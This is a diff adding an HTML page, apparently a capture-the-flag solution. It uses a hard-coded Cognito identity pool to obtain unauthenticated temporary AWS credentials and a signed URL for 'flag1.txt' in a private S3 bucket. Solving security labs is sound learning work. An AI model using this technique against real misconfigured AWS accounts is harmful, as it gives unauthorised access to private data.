@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cognito JavaScript SDK Example</title>
+    <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
+</head>
+<body>
+    <script>
+        // 初始化AWS SDK配置
+        AWS.config.region = 'us-east-1';
+        AWS.config.credentials = new AWS.CognitoIdentityCredentials({
+            IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
+        });
+        // 获取临时凭证
+        AWS.config.credentials.get(function(err) {
+            if (!err) {
+                // 凭证获取成功
+                var accessKeyId = AWS.config.credentials.accessKeyId;
+                var secretAccessKey = AWS.config.credentials.secretAccessKey;
+                var sessionToken = AWS.config.credentials.sessionToken;
+
+                // 进行后续操作，如访问S3
+                accessS3(accessKeyId, secretAccessKey, sessionToken);
+            } else {
+                // 凭证获取失败
+                console.error('Error retrieving credentials: ' + err);
+            }
+        });
+        // 使用临时凭证访问S3
+        function accessS3(accessKeyId, secretAccessKey, sessionToken) {
+            var s3 = new AWS.S3({
+                accessKeyId: accessKeyId,
+                secretAccessKey: secretAccessKey,
+                sessionToken: sessionToken,
+            });
+            var params = {
+                Bucket: 'wiz-privatefiles',
+                Key: 'flag1.txt',
+            };
+            s3.getSignedUrl('getObject', params, function(err, data) {
+                if (!err) {
+                    // S3存储桶对象获取成功
+                    console.log(data);
+                } else {
+                    // S3存储桶对象获取失败
+                    console.error('Error get S3 bucket object: ' + err);
+                }
+            });
+        }
+    </script>
+</body>
+</html>
